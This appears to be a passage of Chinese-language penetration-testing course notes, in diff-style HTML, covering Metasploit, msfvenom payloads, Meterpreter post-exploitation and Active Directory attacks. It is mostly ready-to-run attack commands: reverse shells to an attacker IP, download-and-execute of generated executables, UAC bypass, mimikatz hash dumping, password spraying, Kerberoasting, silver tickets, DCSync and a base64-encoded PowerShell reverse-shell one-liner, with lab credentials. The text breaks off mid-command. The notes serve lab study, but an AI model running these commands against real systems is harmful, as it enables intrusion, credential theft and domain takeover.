+<p>搜索并使用，查看工具模块说明、参数等</p>
+<pre><code class="language-armasm">search type:auxiliary smb
+use 56
+info
+show options
+</code></pre>
+<p>设置参数，取消设置，从数据库中筛选设置，运行，查看结果</p>
+<pre><code class="language-armasm">set RHOSTS 192.168.50.202
+unset RHOSTS
+services -p 445 --rhosts
+run
+vulns
+</code></pre>
+<p>ssh登录尝试工具搜索并使用，查看正确的账号密码</p>
+<pre><code class="language-armasm">search type:auxiliary ssh
+use 15
+show options
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set USERNAME george
+set RHOSTS 192.168.50.201
+set RPORT 2222
+run
+
+creds
+</code></pre>
+<h3 id="2013-漏洞利用模块">20.1.3 漏洞利用模块</h3>
+<p>创建工作区，搜索漏洞利用工具，查看并设置参数，设置payload及参数，运行</p>
+<pre><code class="language-armasm">workspace -a exploits
+search Apache 2.4.49
+use 0
+info
+show options
+set payload payload/linux/x64/shell_reverse_tcp
+show options
+set SSL false
+set RPORT 80
+set RHOSTS 192.168.50.16
+run
+</code></pre>
+<p>成功后获得shell，使用Ctrl+z然后y将session置于后台，列举所有sessions，进入某个session，取消某个session</p>
+<pre><code class="language-armasm">sessions -l
+sessions -i 2
+sessions -k 2
+</code></pre>
+<p>后台监听和持续监听</p>
+<pre><code class="language-armasm">run -j
+run -z
+</code></pre>
+<h2 id="202-msf载荷">20.2 MSF载荷</h2>
+<h3 id="2021-分段与非分段载荷">20.2.1 分段与非分段载荷</h3>
+<p>查看载荷</p>
+<pre><code class="language-armasm">show payloads
+</code></pre>
+<p>一般看有_的是非分段，有/是分段载荷，例如</p>
+<pre><code class="language-armasm">shell_reverse_tcp 非分段
+shell/reverse_tcp 分段
+</code></pre>
+<h3 id="2022-meterpreter载荷">20.2.2 Meterpreter载荷</h3>
+<p>查看，使用，查看参数，在漏洞利用中使用</p>
+<pre><code class="language-armasm">show payloads
+
+payload/linux/x64/meterpreter_reverse_tcp
+
+set payload 11
+show options
+run
+</code></pre>
+<p>获得权限，查看帮助</p>
+<pre><code class="language-armasm">meterpreter &gt; help
+</code></pre>
+<p>查看系统信息</p>
+<pre><code class="language-armasm">sysinfo
+getuid
+</code></pre>
+<p>获得shell，置于后台，查看所有shell信息，进入后台指定shell</p>
+<pre><code class="language-armasm">shell
+
+Ctrl+Z再按y可以把shell放在后台
+channel -l
+channel -i 1
+</code></pre>
+<p>查看本地路径，切换本地路径，下载文件，读取本地文件，上传文件，查看目标机器文件，退出</p>
+<pre><code class="language-armasm">meterpreter &gt; lpwd
+
+lcd /home/kali/Downloads
+download /etc/passwd
+lcat /home/kali/Downloads/passwd
+upload /usr/bin/unix-privesc-check /tmp/
+ls /tmp
+exit
+</code></pre>
+<h3 id="2023-可执行有效载荷">20.2.3 可执行有效载荷</h3>
+<p>查看、生成（非分段）、下载、执行、获得shell</p>
+<pre><code class="language-armasm">msfvenom -l payloads --platform windows --arch x64
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
+iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
+.\nonstaged.exe
+nc -nvlp 443
+</code></pre>
+<p>分段载荷需要在MSF的multi/handler下使用，否则nc监听拿到shell无法执行命令</p>
+<p>生成，启动msf，使用multi/handler</p>
+<pre><code class="language-armasm">msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe
+
+use multi/handler
+set payload windows/x64/shell/reverse_tcp
+show options
+set LHOST 192.168.119.2
+set LPORT 443
+run
+</code></pre>
+<p>后台运行，查看job</p>
+<pre><code class="language-armasm">run -j
+jobs
+</code></pre>
+<h2 id="203-使用msf后渗透">20.3 使用MSF后渗透</h2>
+<h3 id="2031-核心后渗透功能">20.3.1 核心后渗透功能</h3>
+<p>生成payload，上传，运行，获得shell</p>
+<pre><code class="language-armasm">msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
+use multi/handler
+set payload windows/x64/meterpreter_reverse_https
+set LPORT 443
+run
+
+nc 192.168.50.223 4444
+powershell
+iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
+.\met.exe
+</code></pre>
+<p>后渗透功能：查看空闲时间、提权、进程迁移、隐藏窗口运行</p>
+<pre><code class="language-armasm">idletime
+
+shell
+whoami /priv
+有SeImpersonatePrivilege
+exit
+getuid
+getsystem
+getuid
+
+
+ps
+migrate 8052
+ps
+getuid
+
+execute -H -f notepad
+migrate 2720
+</code></pre>
+<h3 id="2032-后渗透模块">20.3.2 后渗透模块</h3>
+<p>bypass UAC</p>
+<pre><code class="language-armasm">getsystem
+ps
+migrate 8044
+getuid
+Server username: ITWK01\offsec
+
+shell
+powershell -ep bypass
+Import-Module NtObjectManager
+Get-NtTokenIntegrityLevel
+Medium  说明有UAC
+
+Ctrl+Z y后台运行shell
+bg
+search UAC
+use exploit/windows/local/bypassuac_sdclt
+show options
+set SESSION 9
+set LHOST 192.168.119.4
+run
+
+shell
+powershell -ep bypass
+Import-Module NtObjectManager
+Get-NtTokenIntegrityLevel
+High
+</code></pre>
+<p>mimikatz获取hash</p>
+<pre><code class="language-armasm">use exploit/multi/handler
+run
+getsystem
+load kiwi
+help
+creds_msv
+</code></pre>
+<h3 id="2033-设置路由和代理">20.3.3 设置路由和代理</h3>
+<pre><code class="language-armasm">ipconfig
+发现是双网卡192和172段
+
+meterpreter &gt; bg
+[*] Backgrounding session 12...
+
+route add 172.16.5.0/24 12
+route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.16.5.0         255.255.255.0      Session 12
+
+端口扫描
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.16.5.200
+set PORTS 445,3389
+run
+
+use exploit/windows/smb/psexec
+set SMBUser luiza
+set SMBPass &quot;BoccieDearAeroMeow1!&quot;
+set RHOSTS 172.16.5.200
+set payload windows/x64/meterpreter/bind_tcp
+set LPORT 8000
+run
+</code></pre>
+<p>自动设置路由</p>
+<pre><code class="language-armasm">use multi/manage/autoroute
+show options
+sessions -l
+set session 12
+run
+就可以自动添加192和172理由
+</code></pre>
+<p>设置代理</p>
+<pre><code class="language-armasm">use auxiliary/server/socks_proxy
+show options
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+
+默认是1080端口
+</code></pre>
+<p>配置，使用</p>
+<pre><code class="language-armasm">tail /etc/proxychains4.conf
+
+socks5 127.0.0.1 1080
+
+sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
+</code></pre>
+<p>端口转发</p>
+<pre><code class="language-armasm">sessions -i 12
+portfwd -h
+portfwd add -l 3389 -p 3389 -r 172.16.5.200
+sudo xfreerdp /v:127.0.0.1 /u:luiza
+</code></pre>
+<h2 id="204-自动化msf">20.4 自动化MSF</h2>
+<h3 id="2041-资源脚本">20.4.1 资源脚本</h3>
+<p>创建脚本文件listener.rc</p>
+<pre><code class="language-armasm">use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 192.168.119.4
+set LPORT 443
+set AutoRunScript post/windows/manage/migrate 
+set ExitOnSession false
+run -z -j
+</code></pre>
+<p>加载脚本文件</p>
+<pre><code class="language-armasm">sudo msfconsole -r listener.rc
+</code></pre>
+<p>运行payload</p>
+<pre><code class="language-armasm">iwr -uri http://192.168.119.4/met.exe -Outfile met.exe
+.\met.exe
+</code></pre>
+<p>获得shell并自动迁移到notepad进程，并后台运行</p>
+<p>其他系统自带脚本</p>
+<pre><code class="language-armasm">ls -l /usr/share/metasploit-framework/scripts/resource
+</code></pre>
+<h2 id="212-ad域手动枚举">21.2 AD域手动枚举</h2>
+<h3 id="2121-windows旧工具">21.2.1 Windows旧工具</h3>
+<p>枚举域用户，查询制定域用户，查询域组，查询组成员</p>
+<pre><code class="language-armasm">xfreerdp /u:stephanie /d:corp.com /v:192.168.50.75
+net user /domain
+net user jeffadmin /domain
+net group /domain
+net group &quot;Sales Department&quot; /domain
+</code></pre>
+<h3 id="2122-使用powershell和net枚举">21.2.2 使用powershell和.NET枚举</h3>
+<p>枚举当前域信息</p>
+<pre><code class="language-armasm">[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+</code></pre>
+<p>编写脚本，并加载运行</p>
+<p>enumeration.ps1</p>
+<pre><code class="language-armasm"># Store the domain object in the $domainObj variable
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Print the variable
+$domainObj
+</code></pre>
+<pre><code class="language-armasm">powershell -ep bypass
+.\enumeration.ps1
+</code></pre>
+<p>查询DC域控</p>
+<pre><code class="language-armasm"># Store the domain object in the $domainObj variable
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Store the PdcRoleOwner name to the $PDC variable
+$PDC = $domainObj.PdcRoleOwner.Name
+
+# Print the $PDC variable
+$PDC
+</code></pre>
+<p>用adsi检索DN</p>
+<pre><code class="language-armasm">([adsi]'').distinguishedName
+</code></pre>
+<pre><code class="language-armasm"># Store the domain object in the $domainObj variable
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+
+# Store the PdcRoleOwner name to the $PDC variable
+$PDC = $domainObj.PdcRoleOwner.Name
+
+# Store the Distinguished Name variable into the $DN variable
+$DN = ([adsi]'').distinguishedName
+
+# Print the $DN variable
+$DN
+</code></pre>
+<p>LDAP枚举</p>
+<pre><code class="language-armasm">$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName 
+$LDAP = &quot;LDAP://$PDC/$DN&quot;
+$LDAP
+</code></pre>
+<pre><code class="language-armasm">PS C:\Users\stephanie&gt; .\enumeration.ps1
+LDAP://DC1.corp.com/DC=corp,DC=com
+</code></pre>
+<h3 id="2123-在脚本中增加搜索功能">21.2.3 在脚本中增加搜索功能</h3>
+<p>使用DirectoryEntry和DirectorySearcher进行搜索</p>
+<pre><code class="language-armasm">$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName 
+$LDAP = &quot;LDAP://$PDC/$DN&quot;
+
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.FindAll()
+</code></pre>
+<p>会得到很多信息，进一步检索主机用户信息</p>
+<pre><code class="language-armasm">$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName 
+$LDAP = &quot;LDAP://$PDC/$DN&quot;
+
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.filter=&quot;samAccountType=805306368&quot;
+$dirsearcher.FindAll()
+</code></pre>
+<p>枚举每个属性</p>
+<pre><code class="language-armasm">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = $domainObj.PdcRoleOwner.Name
+$DN = ([adsi]'').distinguishedName 
+$LDAP = &quot;LDAP://$PDC/$DN&quot;
+
+$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+
+$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.filter=&quot;samAccountType=805306368&quot;
+$result = $dirsearcher.FindAll()
+
+Foreach($obj in $result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop
+    }
+
+    Write-Host &quot;-------------------------------&quot;
+}
+</code></pre>
+<p>查看某个用户（jeffadmin）所属的组</p>
+<pre><code class="language-armasm">$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
+$dirsearcher.filter=&quot;name=jeffadmin&quot;
+$result = $dirsearcher.FindAll()
+
+Foreach($obj in $result)
+{
+    Foreach($prop in $obj.Properties)
+    {
+        $prop.memberof
+    }
+
+    Write-Host &quot;-------------------------------&quot;
+}
+</code></pre>
+<p>做成函数方便自定义参数进行搜索</p>
+<pre><code class="language-armasm">function LDAPSearch {
+    param (
+        [string]$LDAPQuery
+    )
+
+    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+    $DistinguishedName = ([adsi]'').distinguishedName
+
+    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$PDC/$DistinguishedName&quot;)
+
+    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
+
+    return $DirectorySearcher.FindAll()
+
+}
+</code></pre>
+<p>使用的时候，先导入</p>
+<pre><code class="language-armasm">Import-Module .\function.ps1
+</code></pre>
+<p>搜索用户、组</p>
+<pre><code class="language-armasm">LDAPSearch -LDAPQuery &quot;(samAccountType=805306368)&quot;
+LDAPSearch -LDAPQuery &quot;(objectclass=group)&quot;
+</code></pre>
+<p>搜索组中的对象</p>
+<pre><code class="language-armasm">foreach ($group in $(LDAPSearch -LDAPQuery &quot;(objectCategory=group)&quot;)) {$group.properties | select {$_.cn}, {$_.member}}
+</code></pre>
+<p>搜索某个组里的成员</p>
+<pre><code class="language-armasm">$sales = LDAPSearch -LDAPQuery &quot;(&amp;(objectCategory=group)(cn=Sales Department))&quot;
+$sales.properties.member
+</code></pre>
+<p>如有组嵌套可以继续使用上面方法搜索成员</p>
+<h3 id="2124-使用powerview枚举ad">21.2.4 使用PowerView枚举AD</h3>
+<p>导入</p>
+<pre><code class="language-armasm">Import-Module .\PowerView.ps1
+</code></pre>
+<p>枚举域信息、域用户、域用户名、筛选域用户信息、组名、组下成员</p>
+<pre><code class="language-armasm">Get-NetDomain
+Get-NetUser
+Get-NetUser | select cn
+Get-NetUser | select cn,pwdlastset,lastlogon
+Get-NetGroup | select cn
+Get-NetGroup &quot;Sales Department&quot; | select member
+</code></pre>
+<h2 id="213-ad域手动枚举-拓展">21.3 AD域手动枚举-拓展</h2>
+<h3 id="2131-枚举操作系统">21.3.1 枚举操作系统</h3>
+<p>继续PowerView枚举，枚举域主机、筛选主机名和操作系统</p>
+<pre><code class="language-armasm">Get-NetComputer
+Get-NetComputer | select operatingsystem,dnshostname
+</code></pre>
+<h3 id="2132-获取已登录用户">21.3.2 获取已登录用户</h3>
+<p>查看当前用户能访问域内哪些主机</p>
+<pre><code class="language-armasm">Find-LocalAdminAccess
+</code></pre>
+<p>使用当前用户访问域内主机获取信息</p>
+<pre><code class="language-armasm">Get-NetSession -ComputerName files04 -Verbose
+Get-NetSession -ComputerName web04 -Verbose
+
+如果没有权限会显示
+VERBOSE: [Get-NetSession] Error: Access is denied
+</code></pre>
+<p>如果可以访问</p>
+<pre><code class="language-armasm">Get-NetSession -ComputerName client74
+
+CName        : \\192.168.50.75
+UserName     : stephanie
+Time         : 8
+IdleTime     : 0
+ComputerName : client74
+</code></pre>
+<p>针对Windows11操作系统可能无法远程获取到上面信息，因为权限不够，可以查看低版本的操作系统</p>
+<pre><code class="language-armasm">Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
+</code></pre>
+<p>然后可以尝试使用其他工具进行连接枚举已登录用户，比如PsLoggedOn</p>
+<pre><code class="language-armasm">.\PsLoggedon.exe \\files04
+不成功
+Unable to query resource logons
+成功
+Users logged on locally:
+     &lt;unknown time&gt;             CORP\jeffadmin
+
+Users logged on via resource shares:
+     10/5/2022 1:33:32 AM       CORP\stephanie
+</code></pre>
+<h3 id="2133-通过spn服务主体名枚举">21.3.3 通过SPN（服务主体名）枚举</h3>
+<p>列出某个账号的SPN，是向dc进行查询</p>
+<pre><code class="language-armasm">setspn -L iis_service
+</code></pre>
+<p>也可以用PowerView枚举</p>
+<pre><code class="language-armasm">Get-NetUser -SPN | select samaccountname,serviceprincipalname
+</code></pre>
+<p>针对结果中web服务查，看域名对用的ip</p>
+<pre><code class="language-armasm">nslookup.exe web04.corp.com
+</code></pre>
+<h3 id="2134-枚举对象权限">21.3.4 枚举对象权限</h3>
+<p>枚举当前用户权限，使用PowerView</p>
+<pre><code class="language-armasm">Get-ObjectAcl -Identity stephanie
+</code></pre>
+<p>在结果中针对SID标识转换成对象进行查看</p>
+<pre><code class="language-armasm">Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-553
+</code></pre>
+<p>可以获得SecurityIdentifier对ObjectSID的权限ActiveDirectoryRights是ReadProperty</p>
+<p>查看所有对“Management Department”组有GenericAll的权限</p>
+<pre><code class="language-armasm">Get-ObjectAcl -Identity &quot;Management Department&quot; | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier,ActiveDirectoryRights
+</code></pre>
+<p>查看结果中所有sid信息</p>
+<pre><code class="language-armasm">&quot;S-1-5-21-1987370270-658905905-1781884369-512&quot;,&quot;S-1-5-21-1987370270-658905905-1781884369-1104&quot;,&quot;S-1-5-32-548&quot;,&quot;S-1-5-18&quot;,&quot;S-1-5-21-1987370270-658905905-1781884369-519&quot; | Convert-SidToName
+</code></pre>
+<p>发现当前用户有权限，然后将自己加入到Management Department组</p>
+<pre><code class="language-armasm">net group &quot;Management Department&quot; stephanie /add /domain
+Get-NetGroup &quot;Management Department&quot; | select member
+</code></pre>
+<p>可以成功，再删除</p>
+<pre><code class="language-armasm">net group &quot;Management Department&quot; stephanie /del /domain
+Get-NetGroup &quot;Management Department&quot; | select member
+</code></pre>
+<h3 id="2135-枚举域共享">21.3.5 枚举域共享</h3>
+<p>PowerView</p>
+<pre><code class="language-armasm">Find-DomainShare
+</code></pre>
+<p>访问域共享，powershell下</p>
+<pre><code class="language-armasm">ls \\dc1.corp.com\sysvol\corp.com\
+ls \\dc1.corp.com\sysvol\corp.com\Policies\
+cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+</code></pre>
+<p>获得hash，在kali下可以破解</p>
+<pre><code class="language-armasm">gpp-decrypt &quot;+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE&quot;
+</code></pre>
+<p>查看其他共享获得敏感文件</p>
+<pre><code class="language-armasm">ls \\FILES04\docshare
+ls \\FILES04\docshare\docs\do-not-share
+cat \\FILES04\docshare\docs\do-not-share\start-email.txt
+</code></pre>
+<p>邮件中有密码明文</p>
+<h2 id="214-自动枚举">21.4 自动枚举</h2>
+<h3 id="2141-sharphound自动枚举">21.4.1 SharpHound自动枚举</h3>
+<p>导入、帮助</p>
+<pre><code class="language-armasm">Import-Module .\Sharphound.ps1
+Get-Help Invoke-BloodHound
+</code></pre>
+<p>获取域信息</p>
+<pre><code class="language-armasm">Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix &quot;corp audit&quot;
+</code></pre>
+<p>生成zip包文件，下载进行分析</p>
+<h3 id="2142-使用bloodhound进行分析">21.4.2 使用BloodHound进行分析</h3>
+<p>kali下开启数据库</p>
+<pre><code class="language-armasm">sudo neo4j start
+
+http://localhost:7474
+neo4j/neo4j
+</code></pre>
+<p>登录后提示改密码</p>
+<p>启动bloodhound</p>
+<pre><code class="language-armasm">bloodhound
+</code></pre>
+<p>登录neo4j数据库后，在gui界面导入zip包，在界面“Database Info”可以查看域相关所有信息，在“Analysis”可以看到预设的分析策略，比如</p>
+<pre><code class="language-armasm">Find all Domain Admins
+Shortest Paths
+查看最短路径
+</code></pre>
+<p>将获得到权限的用户和主机右键标记为“Mark User as Owned”，然后重新规划获得域控的最短路径</p>
+<h2 id="221-ad身份认证">22.1 AD身份认证</h2>
+<h3 id="2211-ntlm认证">22.1.1 NTLM认证</h3>
+<p>认证时使用ip地址，一共7个步骤</p>
+<p>client --- server --- DC</p>
+<pre><code class="language-armasm">client使用密码计算ntlm
+client将username发送给server
+server返回给client一个随机挑战串nonce
+client使用ntlm加密nonce形成res发给server
+server将res、username、nonce发给DC
+DC上有所有用户的ntlm，使用对用username的ntlm解密res获得nonce，比对nonce是否正确
+DC判断后将结果发给server
+</code></pre>
+<h3 id="2212-kerberos认证">22.1.2 Kerberos认证</h3>
+<p>变换了认证模式</p>
+<p>client --- DC（KDC）</p>
+<p>client --- server</p>
+<p>过程是client向DC请求票据，然后使用票据访问server。</p>
+<h3 id="2213-缓存ad认证信息">22.1.3 缓存AD认证信息</h3>
+<p>hash一般存储在LSASS中，使用mimikatz来dump hash</p>
+<pre><code class="language-armasm">xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.50.75
+cd C:\Tools
+.\mimikatz.exe
+privilege::debug
+获取已登录的用户hash
+sekurlsa::logonpasswords
+</code></pre>
+<p>滥用TGT和服务票证进行身份验证，获取自己和其他用户的票据</p>
+<pre><code class="language-armasm">dir \\web04.corp.com\backup
+sekurlsa::tickets
+</code></pre>
+<p>可以看到TGT和TGS</p>
+<h2 id="222-ad身份认证攻击">22.2 AD身份认证攻击</h2>
+<h3 id="2221-密码喷洒攻击">22.2.1 密码喷洒攻击</h3>
+<p>密码暴力破解会导致密码锁死，所以要先查看密码策略</p>
+<pre><code class="language-armasm">net accounts
+</code></pre>
+<p>如果有密码锁定次数，如5次/30分钟，就只能测试4次/30分钟，不然就会被锁定</p>
+<p>1）一般用密码喷洒（使用LDAP和ADSI）</p>
+<pre><code class="language-armasm">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$PDC = ($domainObj.PdcRoleOwner).Name
+$SearchString = &quot;LDAP://&quot;
+$SearchString += $PDC + &quot;/&quot;
+$DistinguishedName = &quot;DC=$($domainObj.Name.Replace('.', ',DC='))&quot;
+$SearchString += $DistinguishedName
+New-Object System.DirectoryServices.DirectoryEntry($SearchString, &quot;pete&quot;, &quot;Nexus123!&quot;)
+</code></pre>
+<p>如果正确</p>
+<pre><code class="language-armasm">distinguishedName : {DC=corp,DC=com}
+Path              : LDAP://DC1.corp.com/DC=corp,DC=com
+</code></pre>
+<p>错误会显示“The user name or password is incorrect.”</p>
+<p>也可以使用现成脚本https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1</p>
+<pre><code class="language-armasm">cd C:\Tools
+powershell -ep bypass
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+</code></pre>
+<p>2）利用SMB密码喷洒</p>
+<pre><code class="language-armasm">crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+
+crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+显示“Pwn3d!”说明可以成功登录进行控制
+</code></pre>
+<p>3）基于TGT密码喷洒</p>
+<pre><code class="language-armasm">.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt &quot;Nexus123!&quot;
+</code></pre>
+<h3 id="2222-as-rep烘焙">22.2.2 AS-REP烘焙</h3>
+<p>在kali下使用一个域账号及密码向DC请求AS-REQ，验证成功会返回AS-REPKey和TGT，就可以破解密码了。</p>
+<pre><code class="language-armasm">impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+输入密码
+</code></pre>
+<p>破解</p>
+<pre><code class="language-armasm">hashcat --help | grep -i &quot;Kerberos&quot;
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+</code></pre>
+<p>Windows下可以使用Rubeus.exe，使用当前用户权限</p>
+<pre><code class="language-armasm">cd C:\Tools
+.\Rubeus.exe asreproast /nowrap
+</code></pre>
+<p>/nowrap去掉空格，复制下来破解</p>
+<pre><code class="language-armasm">sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+</code></pre>
+<p>枚举可以使用PowerView命令，或者kali上使用impacket-GetNPUsers</p>
+<pre><code class="language-armasm">Get-DomainUser -PreauthNotRequired
+impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete
+</code></pre>
+<h3 id="2223-kerberoasting">22.2.3 Kerberoasting</h3>
+<p>在Windows上使用Rubeus，使用当前用户获取SPN然后请求DC获得TGS-REP</p>
+<pre><code class="language-armasm">.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+</code></pre>
+<p>破解</p>
+<pre><code class="language-armasm">hashcat --help | grep -i &quot;Kerberos&quot;
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+</code></pre>
+<p>kali上使用impacket-GetUserSPNs，需要一个域账号和密码</p>
+<pre><code class="language-armasm">sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+</code></pre>
+<p>一般获得的是SPN服务账号的hash，破解</p>
+<pre><code class="language-armasm">sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+</code></pre>
+<h3 id="2224-白银票据">22.2.4 白银票据</h3>
+<p>在指导SPN服务账号和hash的情况下，使用域SID和SPN，修改不具备权限的用户票据。</p>
+<pre><code class="language-armasm">iwr -UseDefaultCredentials http://web04
+拒绝访问
+</code></pre>
+<p>mimikatz进行获取域SID和SPN账号hash</p>
+<pre><code class="language-armasm">privilege::debug
+sekurlsa::logonpasswords
+
+SID               : S-1-5-21-1987370270-658905905-1781884369-1109
+        msv :
+         [00000003] Primary
+         * Username : iis_service
+         * Domain   : CORP
+         * NTLM     : 4d28cf5252d39971419580a51484ca09
+</code></pre>
+<p>这个SID也可以查看当前用户获得</p>
+<pre><code class="language-armasm">whoami /user
+</code></pre>
+<p>域SID是去掉最后一段</p>
+<p>用mimiaktz伪造票据</p>
+<pre><code class="language-armasm">kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+exit
+</code></pre>
+<p>查看票据，再访问，就可以成功访问了</p>
+<pre><code class="language-armasm">klist
+iwr -UseDefaultCredentials http://web04
+</code></pre>
+<h3 id="2225-dc同步dcsync">22.2.5 DC同步（dcsync）</h3>
+<p>需要域管理员或者企业管理员具有同步权限的用户权限</p>
+<p>Windows下使用mimikatz获得制定用户的hash</p>
+<pre><code class="language-armasm">cd C:\Tools\
+.\mimikatz.exe
+lsadump::dcsync /user:corp\dave
+lsadump::dcsync /user:corp\Administrator
+</code></pre>
+<p>破解</p>
+<pre><code class="language-armasm">hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+</code></pre>
+<p>kali上使用impacket-secretsdump</p>
+<pre><code class="language-armasm">impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:&quot;BrouhahaTungPerorateBroom2023\!&quot;@192.168.50.70
+</code></pre>
+<h2 id="231-ad横向移动技术">23.1 AD横向移动技术</h2>
+<h3 id="2311-wmi和winrm">23.1.1 WMI和WinRM</h3>
+<p>WMI：Windows管理接口（使用135端口和19152-65535之前的高端口），创建计算器进程</p>
+<pre><code class="language-armasm">wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create &quot;calc&quot;
+</code></pre>
+<p>使用powershell</p>
+<pre><code class="language-armasm">$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$options = New-CimSessionOption -Protocol DCOM
+$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
+$command = 'calc';
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+</code></pre>
+<p>要获得反弹shell，可以使用powershell反弹，先做编码</p>
+<pre><code class="language-armasm">import sys
+import base64
+
+payload = '$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.118.2&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+cmd = &quot;powershell -nop -w hidden -e &quot; + base64.b64encode(payload.encode('utf16')[2:]).decode()
+
+print(cmd)
+</code></pre>
+<p>注意编码utf16</p>
+<pre><code class="language-armasm">python3 encode.py
+获得powershell的反弹shell代码
+</code></pre>
+<pre><code class="language-armasm">$username = 'jen';
+$password = 'Nexus123!';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
